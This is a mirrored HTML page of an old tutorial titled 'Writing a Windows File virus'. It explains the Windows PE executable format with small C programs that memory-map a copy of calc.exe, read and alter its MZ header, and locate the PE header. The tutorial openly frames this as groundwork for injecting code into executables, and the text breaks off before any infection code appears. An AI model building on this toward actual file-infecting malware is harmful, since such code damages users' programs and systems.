<html xmlns:v="urn:schemas-microsoft-com:vml"
xmlns:o="urn:schemas-microsoft-com:office:office"
xmlns:w="urn:schemas-microsoft-com:office:word"
xmlns="http://www.w3.org/TR/REC-html40">


<!-- Mirrored from www.vijaymukhi.com/security/windows/pefile.htm by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 11 Oct 2024 14:40:11 GMT -->
<head>
<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
<meta name=ProgId content=Word.Document>
<meta name=Generator content="Microsoft Word 9">
<meta name=Originator content="Microsoft Word 9">
<link rel=File-List href="pefile_files/filelist.xml">
<title>Writing a Windows File virus</title>
<!--[if gte mso 9]><xml>
 <o:DocumentProperties>
  <o:Author>Mr. Vijay Mukhi</o:Author>
  <o:LastAuthor>Mr. Vijay Mukhi</o:LastAuthor>
  <o:Revision>10</o:Revision>
  <o:TotalTime>504</o:TotalTime>
  <o:LastPrinted>2004-06-08T09:54:00Z</o:LastPrinted>
  <o:Created>2004-06-07T12:51:00Z</o:Created>
  <o:LastSaved>2004-03-29T11:44:00Z</o:LastSaved>
  <o:Pages>21</o:Pages>
  <o:Words>9594</o:Words>
  <o:Characters>54690</o:Characters>
  <o:Company>VMCI</o:Company>
  <o:Lines>455</o:Lines>
  <o:Paragraphs>109</o:Paragraphs>
  <o:CharactersWithSpaces>67163</o:CharactersWithSpaces>
  <o:Version>9.2720</o:Version>
 </o:DocumentProperties>
</xml><![endif]--><!--[if gte mso 9]><xml>
 <w:WordDocument>
  <w:DrawingGridHorizontalSpacing>0 pt</w:DrawingGridHorizontalSpacing>
  <w:DrawingGridVerticalSpacing>0 pt</w:DrawingGridVerticalSpacing>
  <w:DisplayHorizontalDrawingGridEvery>0</w:DisplayHorizontalDrawingGridEvery>
  <w:DisplayVerticalDrawingGridEvery>0</w:DisplayVerticalDrawingGridEvery>
  <w:UseMarginsForDrawingGridOrigin/>
  <w:DrawingGridHorizontalOrigin>0 pt</w:DrawingGridHorizontalOrigin>
  <w:DrawingGridVerticalOrigin>0 pt</w:DrawingGridVerticalOrigin>
 </w:WordDocument>
</xml><![endif]-->
<style>
<!--
 /* Font Definitions */
@font-face
	{font-family:"MS Mincho";
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-alt:"\FF2D\FF33 \660E\671D";
	mso-font-charset:128;
	mso-generic-font-family:roman;
	mso-font-format:other;
	mso-font-pitch:fixed;
	mso-font-signature:1 134676480 16 0 131072 0;}
@font-face
	{font-family:"Trebuchet MS";
	panose-1:2 11 6 3 2 2 2 2 2 4;
	mso-font-charset:0;
	mso-generic-font-family:swiss;
	mso-font-pitch:variable;
	mso-font-signature:7 0 0 0 19 0;}
@font-face
	{font-family:"\@MS Mincho";
	panose-1:0 0 0 0 0 0 0 0 0 0;
	mso-font-charset:128;
	mso-generic-font-family:roman;
	mso-font-format:other;
	mso-font-pitch:fixed;
	mso-font-signature:1 134676480 16 0 131072 0;}
@font-face
	{font-family:"Luxi Sans";
	mso-font-alt:Arial;
	mso-font-charset:0;
	mso-generic-font-family:swiss;
	mso-font-pitch:variable;
	mso-font-signature:0 0 0 0 0 0;}
@font-face
	{font-family:"HG Mincho Light J";
	mso-font-charset:0;
	mso-generic-font-family:auto;
	mso-font-pitch:variable;
	mso-font-signature:0 0 0 0 0 0;}
 /* Style Definitions */
p.MsoNormal, li.MsoNormal, div.MsoNormal
	{mso-style-parent:"";
	margin:0in;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	mso-hyphenate:none;
	font-size:12.0pt;
	mso-bidi-font-size:10.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";}
h1
	{mso-style-next:Normal;
	margin:0in;
	margin-bottom:.0001pt;
	text-align:justify;
	mso-pagination:widow-orphan;
	page-break-after:avoid;
	mso-outline-level:1;
	mso-hyphenate:none;
	font-size:10.0pt;
	font-family:"Trebuchet MS";
	mso-font-kerning:0pt;
	font-weight:normal;
	text-decoration:underline;
	text-underline:single;}
h6
	{mso-style-next:Normal;
	margin-top:12.0pt;
	margin-right:0in;
	margin-bottom:3.0pt;
	margin-left:0in;
	mso-pagination:widow-orphan;
	mso-outline-level:6;
	font-size:11.0pt;
	font-family:"Times New Roman";}
p.MsoHeader, li.MsoHeader, div.MsoHeader
	{margin:0in;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	mso-hyphenate:none;
	tab-stops:center 3.0in right 6.0in;
	font-size:12.0pt;
	mso-bidi-font-size:10.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";}
p.MsoFooter, li.MsoFooter, div.MsoFooter
	{margin:0in;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	mso-hyphenate:none;
	tab-stops:center 3.0in right 6.0in;
	font-size:12.0pt;
	mso-bidi-font-size:10.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";}
p.MsoBodyText, li.MsoBodyText, div.MsoBodyText
	{margin:0in;
	margin-bottom:.0001pt;
	text-align:justify;
	mso-pagination:widow-orphan;
	mso-hyphenate:none;
	font-size:10.0pt;
	font-family:"Trebuchet MS";
	mso-fareast-font-family:"Times New Roman";
	mso-bidi-font-family:"Times New Roman";}
p.MsoBodyText2, li.MsoBodyText2, div.MsoBodyText2
	{margin:0in;
	margin-bottom:.0001pt;
	text-align:justify;
	mso-pagination:widow-orphan;
	mso-hyphenate:none;
	font-size:10.0pt;
	font-family:"Trebuchet MS";
	mso-fareast-font-family:"Times New Roman";
	mso-bidi-font-family:"Times New Roman";
	color:#000066;}
a:link, span.MsoHyperlink
	{color:blue;
	text-decoration:underline;
	text-underline:single;}
a:visited, span.MsoHyperlinkFollowed
	{color:purple;
	text-decoration:underline;
	text-underline:single;}
p.Heading, li.Heading, div.Heading
	{mso-style-name:Heading;
	mso-style-next:"Body Text";
	margin-top:12.0pt;
	margin-right:0in;
	margin-bottom:6.0pt;
	margin-left:0in;
	mso-pagination:widow-orphan;
	page-break-after:avoid;
	mso-hyphenate:none;
	font-size:14.0pt;
	mso-bidi-font-size:10.0pt;
	font-family:"Luxi Sans";
	mso-fareast-font-family:"HG Mincho Light J";
	mso-bidi-font-family:"Times New Roman";}
p.WW-PlainText, li.WW-PlainText, div.WW-PlainText
	{mso-style-name:"WW-Plain Text";
	margin:0in;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	mso-hyphenate:none;
	font-size:10.0pt;
	font-family:"Courier New";
	mso-fareast-font-family:"Times New Roman";
	mso-bidi-font-family:"Times New Roman";}
p.Framecontents, li.Framecontents, div.Framecontents
	{mso-style-name:"Frame contents";
	mso-style-parent:"Body Text";
	margin:0in;
	margin-bottom:.0001pt;
	text-align:justify;
	mso-pagination:widow-orphan;
	mso-hyphenate:none;
	font-size:10.0pt;
	font-family:"Trebuchet MS";
	mso-fareast-font-family:"Times New Roman";
	mso-bidi-font-family:"Times New Roman";}
span.WW-Absatz-Standardschriftart
	{mso-style-name:WW-Absatz-Standardschriftart;
	mso-style-parent:"";}
span.WW-Absatz-Standardschriftart1
	{mso-style-name:WW-Absatz-Standardschriftart1;
	mso-style-parent:"";}
span.WW-DefaultParagraphFont
	{mso-style-name:"WW-Default Paragraph Font";
	mso-style-parent:"";}
 /* Page Definitions */
@page
	{mso-footnote-position:beneath-text;}
@page Section1
	{size:8.5in 11.0in;
	margin:1.0in 1.25in 1.1in 1.25in;
	mso-header-margin:.5in;
	mso-footer-margin:35.45pt;
	mso-page-numbers:158;
	mso-even-header:url("pefile_files/header.html") eh1;
	mso-header:url("pefile_files/header.html") h1;
	mso-even-footer:url("pefile_files/header.html") ef1;
	mso-footer:url("pefile_files/header.html") f1;
	mso-first-header:url("pefile_files/header.html") fh1;
	mso-first-footer:url("pefile_files/header.html") ff1;
	mso-paper-source:0;}
div.Section1
	{page:Section1;}
-->
</style>
<!--[if gte mso 9]><xml>
 <o:shapedefaults v:ext="edit" spidmax="6145">
  <o:colormru v:ext="edit" colors="#fafaff"/>
  <o:colormenu v:ext="edit" fillcolor="#fafaff" strokecolor="none [1]"
   shadowcolor="none [2]"/>
 </o:shapedefaults></xml><![endif]--><!--[if gte mso 9]><xml>
 <o:shapelayout v:ext="edit">
  <o:idmap v:ext="edit" data="1"/>
 </o:shapelayout></xml><![endif]-->
</head>

<body bgcolor="#fafaff" lang=EN-US link=blue vlink=purple style='tab-interval:
.5in'>

<div class=Section1>

<table border=1 cellspacing=0 cellpadding=0 width="99%" bgcolor="#eeeeff"
 style='width:99.54%;background:#EEEEFF;border-collapse:collapse;border:none;
 mso-border-alt:solid windowtext .5pt;mso-padding-alt:0in 5.4pt 0in 5.4pt'>
 <tr style='height:15.1pt'>
  <td width="100%" valign=top style='width:100.0%;border:solid windowtext .5pt;
  padding:0in 5.4pt 0in 5.4pt;height:15.1pt'>
  <h6 align=center style='margin:0in;margin-bottom:.0001pt;text-align:center;
  page-break-after:avoid'><span style='mso-bidi-font-size:10.0pt;color:#000066;
  mso-text-raise:3.0pt;letter-spacing:1.0pt'>Windows PE File Format</span><sup><o:p></o:p></sup></h6>
  </td>
 </tr>
</table>

<p class=MsoNormal><sup><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></sup></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
color:#000066'>Viruses are resident programs in memory, which came into being
due to the loopholes in DOS. Earlier on, they were termed as TSR – Terminate
and Stay Resident and were mostly coded in the C programming language or in
assembler. These viruses were normally found present in the boot record or in
the partition table and termed as COM file viruses. Then came a new genre of
file viruses, which were mostly seen in (.exe) executable files. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>However, now the range is too large.
An executable file need not always end with the extension of exe, it can very
well be a pif (program information file) file too. Besides, viruses are greatly
seen in the form of word macros in doc files. Whatever be the file type, while
injecting a virus into a file, one must be well-conversant with its internal
structure. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>This chapter explains how an
executable file can be infected, thus calling for a complete cross-section of
an exe file. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Prior to the Windows operating
system, there was only DOS which had its own executable file format. The
designers of Windows created their own executable file format called the PE or
Portable Executable file format. However, this file format was totally
different from that of DOS. The windows operating system had the capability of
understanding the DOS exe file format but the reverse would need a miracle.
Thus if average joe executes a dos exe file under windows, the windows
operating<span style="mso-spacerun: yes">  </span>system would handle it, but
if the reverse happened, i.e. a windows exe file under DOS, then DOS would get
all lost and refuse to recognize the file as an exe file and emit a cryptic
error 'Bad Command or file name'. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>This indeed would lead to great
confusion for the average user. Thus to straighten things out, all windows
files start with a valid DOS header. As a result, if a windows executable was
given to dos, it would display a polite message 'This program must be run under
Windows. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The programs given below display the
internal structure of a windows file but in a 'one step at a time' approach. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>a.cpp<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>#include &lt;windows.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>#include &lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>HANDLE hfile,hfile1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>unsigned char *mappedfile;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>void main()<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>hfile =
CreateFile(&quot;test.exe&quot;,GENERIC_WRITE |
GENERIC_READ,0,0,OPEN_EXISTING,0,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>hfile1 = CreateFileMapping (hfile, 0,
PAGE_READWRITE, 0, 0, 0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>mappedfile = (unsigned char
*)MapViewOfFile(hfile1,FILE_MAP_ALL_ACCESS,0,0,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;hfile=%p hfile1=%p
mappedfile=%p\n&quot;,hfile,hfile1,mappedfile);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&gt;copy c:\winnt\system32\calc.exe
test.exe<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>Output<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>hfile=00000030 hfile1=0000002C
mappedfile=00310000<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>As our code follows the rules of<span
style="mso-spacerun: yes">  </span>C++, the header files, windows.h and stdio.h
are required to bring in the prototypes. Header files are also significant<span
style="mso-spacerun: yes">  </span>when macros and structure tags are used in
the program. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoBodyText><span style='color:#000066'>In order to inject the code in
an exe file, i.e. test.exe, the file needs to be opened. Therefore, the
CreateFile function is used with the filename as one of its parameter. The file
test.exe is a copy of the calculator program calc.exe. <o:p></o:p></span></p>

<p class=MsoBodyText><span style='color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>This function takes seven parameters
of which only three are useful. The first is the name of the program, the
second the mode the file is to be opened in, in our case read and write and
finally the fourth parameter specifies that if the file already exists on disk,
then it should be opened rather than creating it. The function CreateFile opens
the file for reading and writing as per our program and returns a HANDLE to
this file. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>A return value of handle which is
basically a typedef to a void * is a technique windows uses to convey the
message that the variable hfile is out of bounds. This variable cannot be used
in any way other than a function parameter, thus displaying its value is simply
of no use. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The file test.exe is loaded into
memory through an array using the functions that accomplish this task. Thus it
is not a difficult job, but any changes made to this file will be in memory and
not on disk<span style="mso-spacerun: yes">  </span>hence 'saving to disk' task
has to be done manually. Nevertheless, with the help of two functions,
CreateFileMapping and MapViewOfFile the file is loaded<span
style="mso-spacerun: yes">  </span>into memory. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The first function, CreateFile</span><span
style='color:#000066'>Mapping takes one more parameter besides the file handle.
This paramter gives the write permission to the file. The </span><span
style='font-size:10.0pt;font-family:"Trebuchet MS";color:#000066'>MapViewOfFile
function specifies the access rights and the value returned by it is a void *
and hence the cast. Casting is a necessary evil while coding in C++ . <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The value of mappedfile shown as
310000 is where the contents of the file test.exe are loaded and our next
program simply verifies this declaration. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>a.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>#include &lt;windows.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>#include &lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>HANDLE hfile,hfile1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>unsigned char *pmappedfile;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>void main()<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>hfile =
CreateFile(&quot;test.exe&quot;,GENERIC_WRITE |
GENERIC_READ,0,0,OPEN_EXISTING,0,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>hfile1 = CreateFileMapping (hfile, 0,
PAGE_READWRITE, 0, 0, 0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>pmappedfile = (unsigned char
*)MapViewOfFile(hfile1,FILE_MAP_ALL_ACCESS,0,0,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;%c%c\n&quot;,*pmappedfile,*(pmappedfile+1));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>*pmappedfile = 65;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Output<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>MZ<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>This program displays the first two
bytes of an exe file under windows. These happen to be the ASCII values of M
and Z. Every file under DOS begins with a signature MZ. Again, as every file
under windows is also a DOS file , the above signature are visible there too
and the output simply proves this point. Next, the first byte is changed to A
or 65 from M. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>When the program quits out, the
system changes the first byte of test.exe on the disk also . Now try executing
test.exe at the dos prompt.<span style="mso-spacerun: yes">  </span>You will
see an error stating that the file is not a<span style="mso-spacerun: yes"> 
</span>valid Windows executable.<span style="mso-spacerun: yes">  </span><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Undo the above damage by changing the
last line in the program to <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>*pmappedfile ='M';<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>and run the program. The file
test.exe now executes as before.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>a.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>#include &lt;windows.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>#include &lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>HANDLE hfile,hfile1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>unsigned char *pmappedfile;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>void main()<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>hfile = CreateFile(&quot;test.exe&quot;,GENERIC_WRITE
| GENERIC_READ,0,0,OPEN_EXISTING,0,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>hfile1 = CreateFileMapping (hfile, 0,
PAGE_READWRITE, 0, 0, 0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>pmappedfile = (unsigned char
*)MapViewOfFile(hfile1,FILE_MAP_ALL_ACCESS,0,0,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>IMAGE_DOS_HEADER
*pimagedosheader<span style="mso-spacerun: yes">  </span>= (IMAGE_DOS_HEADER
*)pmappedfile;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;e_lfanew=%d\n&quot;,pimagedosheader-&gt;e_lfanew);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Output<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>200<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>We would like to repeat ourselves
that every executable file under windows starts with a dos program and the
first two bytes have to be MZ. Once the DOS program ends, then comes the
windows header . Microsoft did not hard code the size of this dos program but
with the DOS file header comes one field e_lfanew which stores the size of the
DOS program. This value in our case is 200 . <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>a.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>#include &lt;windows.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>#include &lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>HANDLE hfile,hfile1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>unsigned char *pmappedfile, *dummy;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>void main()<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>hfile =
CreateFile(&quot;test.exe&quot;,GENERIC_WRITE |
GENERIC_READ,0,0,OPEN_EXISTING,0,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>hfile1 = CreateFileMapping (hfile, 0,
PAGE_READWRITE, 0, 0, 0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>pmappedfile = (unsigned char *)MapViewOfFile(hfile1,FILE_MAP_ALL_ACCESS,0,0,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>IMAGE_DOS_HEADER
*pimagedosheader<span style="mso-spacerun: yes">  </span>= (IMAGE_DOS_HEADER
*)pmappedfile;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>dummy = (unsigned char<span
style="mso-spacerun: yes">  </span>*)(pmappedfile +
pimagedosheader-&gt;e_lfanew);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;%c%c %d
%d\n&quot;,*dummy,*(dummy+1),*(dummy+2),*(dummy+3));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>IMAGE_FILE_HEADER * pimagefileheader
